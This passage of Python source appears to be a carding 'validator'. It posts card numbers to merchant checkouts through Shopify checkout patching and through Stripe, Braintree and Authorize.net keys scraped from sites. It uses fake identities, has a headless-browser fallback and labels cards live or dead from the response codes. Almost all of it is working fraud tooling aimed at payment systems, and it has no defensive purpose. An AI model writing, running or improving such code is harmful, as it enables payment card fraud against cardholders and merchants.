            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Shopify-Checkout-Token": token,
                "Origin": base,
                "Referer": f"{base}/checkouts/{token}/payment",
                "Accept": "text/html,application/xhtml+xml",
            }
            async with session.post(f"{base}/checkouts/{token}", data=payload,
                                    headers=headers, allow_redirects=True) as r:
                result_html = await r.text(errors="ignore")
                result_url = str(r.url)

            verdict = self._interpret(result_html, result_url)
            verdict.latency_ms = int((time.perf_counter() - t0) * 1000)
            return verdict

    async def _patch_checkout(self, session, base: str, token: str,
                              payload: dict) -> Optional[str]:
        data = {"_method": "patch", **payload}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Shopify-Checkout-Token": token,
            "Accept": "text/html,application/xhtml+xml",
            "Origin": base,
            "Referer": f"{base}/checkouts/{token}",
        }
        try:
            async with session.post(f"{base}/checkouts/{token}", data=data,
                                    headers=headers, allow_redirects=True) as r:
                if r.status >= 500:
                    return None
                return await r.text(errors="ignore")
        except Exception:
            log.warning("patch checkout falló", exc_info=True)
            return None

    async def _tokenize_deposit(self, session, base: str, card: Card,
                                identity: Identity) -> Optional[str]:
        scope = urlparse(base).netloc
        payload = {
            "credit_card[number]": card.number,
            "credit_card[month]": card.month,
            "credit_card[year]": card.year,
            "credit_card[verification_value]": card.cvv,
            "credit_card[name]": identity.full_name,
            "payment_session_scope": scope,
        }
        try:
            async with session.post("https://deposit.us.shopifycs.com/sessions",
                                    json=payload) as r:
                if r.status != 200:
                    return None
                data = await r.json(content_type=None)
            return data.get("id")
        except Exception:
            log.warning("tokenización deposit falló", exc_info=True)
            return None

    # -----------------------------------------------------------------------
    # RUTA 2a — Stripe directo (PaymentIntent / PaymentMethod)
    # -----------------------------------------------------------------------
    async def _stripe_direct(self, analysis: Analysis, card: Card) -> Optional[Verdict]:
        if not analysis.public_keys:
            return None
        pk = analysis.public_keys[0]
        identity = random_identity(analysis.country)
        headers = {"Authorization": f"Bearer {pk}",
                   "Content-Type": "application/x-www-form-urlencoded"}
        base = {"key": pk,
                "billing_details[name]": identity.full_name,
                "billing_details[address][postal_code]": identity.zip_code,
                "billing_details[address][country]": identity.country}

        async with self._new_session() as session:
            # PaymentMethod
            pm_payload = {
                **base,
                "type": "card",
                "card[number]": card.number,
                "card[exp_month]": card.month,
                "card[exp_year]": card.year,
                "card[cvc]": card.cvv,
            }
            async with session.post("https://api.stripe.com/v1/payment_methods",
                                    data=pm_payload, headers=headers) as r:
                pm = await r.json(content_type=None)

            if "error" in pm:
                return self._stripe_error(pm["error"])

            pm_id = pm.get("id")
            if not pm_id:
                return None

            secret = analysis.stripe_client_secret
            if not secret:
                # Sin PaymentIntent solo validamos el token: LIVE CCN, no LIVE AUTH.
                return Verdict(LIVE_CCN, "PaymentMethod creado (sin PI para confirmar)")

            pi_id = secret.split("_secret_")[0]
            confirm = {
                "payment_method": pm_id,
                "client_secret": secret,
                "return_url": analysis.base_url + "/checkout",
                "use_stripe_sdk": "true",
            }
            async with session.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                                    data=confirm, headers=headers) as r:
                res = await r.json(content_type=None)

            if "error" in res:
                return self._stripe_error(res["error"])

            status = res.get("status")
            if status == "succeeded":
                return Verdict(LIVE_AUTH, "PaymentIntent succeeded")
            if status == "requires_action":
                return Verdict(LIVE_3DS, "PaymentIntent requires_action (3DS)")
            if status in ("requires_capture", "processing"):
                return Verdict(LIVE_AUTH, f"PaymentIntent {status}")
            return Verdict(LIVE, f"PaymentIntent status={status}")

    @staticmethod
    def _stripe_error(err: dict) -> Verdict:
        code = (err.get("code") or "").lower()
        msg = err.get("message") or code or "error"
        if code in ("incorrect_cvc", "incorrect_zip"):
            return Verdict(LIVE_CCN, msg)
        if code in ("insufficient_funds", "card_declined", "generic_decline"):
            return Verdict(LIVE_AUTH if code == "insufficient_funds" else DEAD_AUTH, msg)
        if code in ("expired_card", "invalid_number", "invalid_expiry_year",
                    "invalid_expiry_month"):
            return Verdict(DEAD_AUTH, msg)
        if err.get("decline_code") == "insufficient_funds":
            return Verdict(LIVE_AUTH, msg)
        return Verdict(DEAD_AUTH, msg)

    # -----------------------------------------------------------------------
    # RUTA 2b — Braintree directo (tokenizeCreditCard vía GraphQL)
    # -----------------------------------------------------------------------
    async def _braintree_direct(self, analysis: Analysis, card: Card) -> Optional[Verdict]:
        key = analysis.braintree_key
        if not key:
            return None

        query = (
            "mutation T($input: TokenizeCreditCardInput!) {"
            " tokenizeCreditCard(input: $input) {"
            "   paymentMethod { id }"
            "   creditCard { bin last4 brandCode } } }"
        )
        variables = {"input": {
            "creditCard": {
                "number": card.number,
                "expirationMonth": card.month,
                "expirationYear": card.year,
                "cvv": card.cvv,
            },
            "options": {"validate": True},
        }}

        async with self._new_session() as session:
            async with session.post(
                "https://payments.braintree-api.com/graphql",
                json={"query": query, "variables": variables},
                headers={"Authorization": f"Bearer {key}",
                         "Braintree-Version": "2019-01-01",
                         "Content-Type": "application/json"},
            ) as r:
                data = await r.json(content_type=None)

        if data.get("errors"):
            msg = data["errors"][0].get("message", "braintree error")
            low = msg.lower()
            if "cvv" in low or "verification" in low:
                return Verdict(LIVE_CCN, msg)
            return Verdict(DEAD_AUTH, msg)

        result = (data.get("data") or {}).get("tokenizeCreditCard") or {}
        if result.get("paymentMethod", {}).get("id"):
            # Tokenización OK: la tarjeta existe, pero sin transacción no hay
            # respuesta bancaria. Etiqueta honesta: LIVE CCN.
            return Verdict(LIVE_CCN, "tokenizeCreditCard OK")
        return None

    # -----------------------------------------------------------------------
    # RUTA 2c — Authorize.net Accept.js (securePaymentContainerRequest)
    # -----------------------------------------------------------------------
    async def _authnet_direct(self, analysis: Analysis, card: Card) -> Optional[Verdict]:
        if not (analysis.anet_login and analysis.anet_client):
            return None

        ref = str(random.randint(10**11, 10**12 - 1))
        payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": analysis.anet_login,
                    "clientKey": analysis.anet_client,
                },
                "data": {
                    "type": "TOKEN",
                    "id": ref,
                    "clientKey": analysis.anet_client,
                    "cardData": {
                        "cardNumber": card.number,
                        "expirationDate": f"{card.month}{card.year}",
                        "cardCode": card.cvv,
                    },
                },
            }
        }

        async with self._new_session() as session:
            async with session.post("https://api.authorize.net/xml/v1/request.api",
                                    json=payload,
                                    headers={"Content-Type": "application/json"}) as r:
                data = await r.json(content_type=None)

        if data.get("opaqueData", {}).get("dataValue"):
            return Verdict(LIVE_CCN, "Accept.js TOKEN OK")

        messages = (data.get("messages") or {}).get("message") or []
        text = " ".join(m.get("text", "") for m in messages) or "authnet error"
        low = text.lower()
        if "zip" in low or "cvv" in low or "code" in low:
            return Verdict(LIVE_CCN, text)
        return Verdict(DEAD_AUTH, text)

    # -----------------------------------------------------------------------
    # RUTA 3 — Browserless. Fallback universal, cierre garantizado.
    # -----------------------------------------------------------------------
    async def _browserless(self, analysis: Analysis, card: Card) -> Optional[Verdict]:
        identity = random_identity(analysis.country)
        context = {
            "url": analysis.url,
            "base": analysis.base_url,
            "variantId": analysis.variant_id or "",
            "card": card.number,
            "month": card.month,
            "year": card.year,
            "cvv": card.cvv,
            "identity": identity.__dict__ if hasattr(identity, "__dict__") else {
                "first": identity.first, "last": identity.last, "email": identity.email,
                "address": identity.address, "city": identity.city,
                "zip_code": identity.zip_code, "country": identity.country,
                "phone": identity.phone, "full_name": identity.full_name,
            },
        }

        # Si el navegador encuentra una llamada a Stripe, esa es la fuente más
        # fiable: la interpretamos antes que el HTML.
        if analysis.processor == "STRIPE":
            data = await self._bl_call(_BL_STRIPE_JS, context)
            if stripe := data.get("stripe"):
                if isinstance(stripe, dict):
                    if err := stripe.get("error"):
                        return self._stripe_error(err)
                    if stripe.get("status") == "succeeded":
                        return Verdict(LIVE_AUTH, "Stripe (browserless) succeeded")
            if data.get("url") or data.get("notice"):
                return self._interpret(data.get("body", ""), data.get("url", ""),
                                       notice=data.get("notice", ""))

        data = await self._bl_call(_BL_CHECKOUT_JS, context)
        if not data:
            return None
        return self._interpret(data.get("body", ""), data.get("url", ""),
                               notice=data.get("notice", ""))

    # -----------------------------------------------------------------------
    # Interpretación de respuesta
    # -----------------------------------------------------------------------
    def _interpret(self, html: str, url: str, notice: str = "") -> Verdict:
        u = (url or "").lower()
        n = (notice or _extract_notice(html or "")).strip()
        low = n.lower()

        # Terminales fuertes primero, ANTES del check de notice vacío:
        # un redirect a 3DS no tiene notice y no es un rechazo.
        if "/thank_you" in u or "/orders/" in u:
            return Verdict(LIVE_AUTH, n or "Thank you page — cargo autorizado")
        if "/3d_secure" in u or "/challenge" in u:
            return Verdict(LIVE_3DS, n or "3DS challenge disparado")

        for kw in _CVV_LIVE:
            if kw in low:
                return Verdict(LIVE_CCN, n[:200])
        if "cvv" in low or "security code" in low:
            return Verdict(LIVE_CCN, n[:200])

        for kw in _FUNDS_LIVE:
            if kw in low:
                return Verdict(LIVE_AUTH, n[:200])

        for kw in _AVS_LIVE:
            if kw in low:
                return Verdict(LIVE, n[:200])

        if not n:
            return Verdict(DEAD_AUTH, "Sin notice (rechazo silencioso)")

        for kw in _DEAD:
            if kw in low:
                return Verdict(DEAD_AUTH, n[:200])

        return Verdict(DEAD_AUTH, n[:200])

    # -- utilidades --------------------------------------------------------

    def invalidate(self, url: Optional[str] = None) -> None:
        if url:
            self._cache.pop(url, None)
        else:
            self._cache.clear()


# ===========================================================================
# Smoke test CLI
#   python validator.py <url_producto> <cc|mm|yy|cvv>
# ===========================================================================

async def _main() -> None:
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)-7s %(name)s | %(message)s",
    )

    if len(sys.argv) < 3:
        print("uso: python validator.py <url_producto> <cc|mm|yy|cvv>")
        raise SystemExit(1)

    url, raw = sys.argv[1], sys.argv[2]

    @dataclass
    class _Gate:
        name: str
        url: str

    async def _on_verdict(v: Verdict, c: Card) -> None:
        print(f"[telemetría] {v.route} {v.status} {c.masked} {v.latency_ms}ms")

    validator = CardValidator(on_verdict=_on_verdict)
    gate = _Gate(name="smoke", url=url)

    card = normalize_card(raw)
    print(f"tarjeta: {card.wire()} ({card.brand})")

    t0 = time.perf_counter()
    verdict = await validator.validate(card, gate)
    total = int((time.perf_counter() - t0) * 1000)

    print("-" * 60)
    print(f"STATUS  : {verdict.status}")
    print(f"MENSAJE : {verdict.message}")
    print(f"RUTA    : {verdict.route}")
    print(f"PROC    : {verdict.processor}")
    print(f"LATENCIA: {total} ms (ruta {verdict.latency_ms} ms)")
    print("-" * 60)

    await asyncio.sleep(0.2)  # deja cerrar las tareas de telemetría


if __name__ == "__main__":
    asyncio.run(_main())